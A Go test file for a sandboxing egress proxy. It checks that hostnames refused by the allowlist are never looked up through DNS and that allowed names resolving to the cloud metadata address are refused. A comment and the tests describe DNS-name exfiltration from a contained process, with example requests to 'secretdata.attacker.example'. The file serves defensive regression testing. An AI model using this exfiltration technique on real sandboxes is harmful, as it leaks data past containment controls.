package nvx

import (
	"encoding/binary"
	"io"
	"net"
	"strconv"
	"strings"
	"sync/atomic"
	"testing"
	"time"
)

// A name the allowlist refuses is refused without being looked up.
//
// Both handlers resolved the requested name before asking the allowlist, so a
// contained process could send data out in the names it asked for: CONNECT
// secretdata.attacker.example:443 made nvx look the name up on the host's
// network, and only then answer 403. Every platform's sandbox blocks the
// contained process's own DNS, so this was the way out that remained.

// countingResolver replaces resolveEgressTarget with answer and counts the
// calls.
func countingResolver(t *testing.T, answer func(string) ([]net.IP, error)) *atomic.Int32 {
	t.Helper()
	// Dial directly, so the test does not depend on the machine's own proxy.
	for _, k := range []string{"HTTPS_PROXY", "https_proxy", "HTTP_PROXY", "http_proxy"} {
		t.Setenv(k, "")
	}
	var calls atomic.Int32
	orig := resolveEgressTarget
	resolveEgressTarget = func(host string) ([]net.IP, error) {
		calls.Add(1)
		return answer(host)
	}
	t.Cleanup(func() { resolveEgressTarget = orig })
	return &calls
}

// socksConnectName asks p's SOCKS listener for a tunnel to host:port by name,
// and returns the reply code, 0 when granted.
func socksConnectName(t *testing.T, p *EgressProxy, host string, port uint16) byte {
	t.Helper()
	conn, err := net.DialTimeout("tcp", p.socksAddr, 3*time.Second)
	if err != nil {
		t.Fatalf("dial SOCKS listener: %v", err)
	}
	defer conn.Close()
	if method, ok := negotiate(t, conn, []byte{methodUserPwd}, proxyAuthUser, p.token); method != methodUserPwd || !ok {
		t.Fatalf("SOCKS authentication failed: method %#x, ok %v", method, ok)
	}
	req := []byte{socksVersion, cmdConnect, 0x00, 0x03, byte(len(host))}
	req = append(req, host...)
	req = binary.BigEndian.AppendUint16(req, port)
	if _, err := conn.Write(req); err != nil {
		t.Fatalf("write SOCKS request: %v", err)
	}
	resp := make([]byte, 4)
	if _, err := io.ReadFull(conn, resp); err != nil {
		t.Fatalf("read SOCKS reply: %v", err)
	}
	return resp[1]
}

func TestARefusedNameIsNeverLookedUp(t *testing.T) {
	calls := countingResolver(t, func(string) ([]net.IP, error) {
		return []net.IP{net.ParseIP("203.0.113.7")}, nil
	})
	p := proxyAllowing(t, "pkgs.example.test:443")

	t.Run("CONNECT", func(t *testing.T) {
		calls.Store(0)
		status, _ := connectThrough(t, p, "secretdata.attacker.example:443")
		if !strings.Contains(status, " 403 ") {
			t.Fatalf("CONNECT to a name off the allowlist got %q, want 403", status)
		}
		if n := calls.Load(); n != 0 {
			t.Fatalf("CONNECT to a refused name looked it up %d time(s); the name reached the host's resolver", n)
		}
	})
	t.Run("SOCKS", func(t *testing.T) {
		calls.Store(0)
		if code := socksConnectName(t, p, "moredata.attacker.example", 443); code == 0x00 {
			t.Fatal("SOCKS granted a name off the allowlist")
		}
		if n := calls.Load(); n != 0 {
			t.Fatalf("SOCKS request for a refused name looked it up %d time(s); the name reached the host's resolver", n)
		}
	})
}

// An allowlisted name is looked up once, and the tunnel reaches that answer.
func TestAnAllowedNameIsLookedUpOnceAndConnects(t *testing.T) {
	_, port, _ := net.SplitHostPort(echoTarget(t))
	calls := countingResolver(t, func(host string) ([]net.IP, error) {
		if host == "pkgs.example.test" {
			return []net.IP{net.ParseIP("127.0.0.1")}, nil
		}
		return nil, nil
	})
	p := proxyAllowing(t, "pkgs.example.test:"+port)

	status, echo := connectThrough(t, p, "pkgs.example.test:"+port)
	if !strings.Contains(status, " 200 ") || echo != "ping" {
		t.Fatalf("CONNECT to an allowlisted name did not tunnel: status %q, echo %q", status, echo)
	}
	if n := calls.Load(); n != 1 {
		t.Fatalf("CONNECT looked the allowed name up %d times, want once", n)
	}

	portNum, _ := strconv.ParseUint(port, 10, 16)
	if code := socksConnectName(t, p, "pkgs.example.test", uint16(portNum)); code != 0x00 {
		t.Fatalf("SOCKS refused an allowlisted name with reply %#x", code)
	}
	if n := calls.Load(); n != 2 {
		t.Fatalf("SOCKS looked the allowed name up %d times, want once", n-1)
	}
}

// An allowlisted name that resolves to the cloud metadata address is still
// refused, after its one lookup.
func TestAnAllowedNameResolvingToLinkLocalIsStillRefused(t *testing.T) {
	calls := countingResolver(t, func(host string) ([]net.IP, error) {
		return resolveEgressAddresses(host, func(string) ([]net.IP, error) {
			return []net.IP{net.ParseIP("169.254.169.254")}, nil
		})
	})
	p := proxyAllowing(t, "pkgs.example.test:80")

	status, _ := connectThrough(t, p, "pkgs.example.test:80")
	if !strings.Contains(status, " 403 ") {
		t.Fatalf("an allowlisted name resolving to 169.254.169.254 got %q, want 403", status)
	}
	if n := calls.Load(); n != 1 {
		t.Fatalf("the allowed name was looked up %d times, want once", n)
	}
	if !auditContains(t, p.nvxHome, "egress_deny_resolved") {
		t.Error("the link-local refusal was not recorded as egress_deny_resolved")
	}
	if code := socksConnectName(t, p, "pkgs.example.test", 80); code == 0x00 {
		t.Fatal("SOCKS granted an allowlisted name resolving to 169.254.169.254")
	}
}
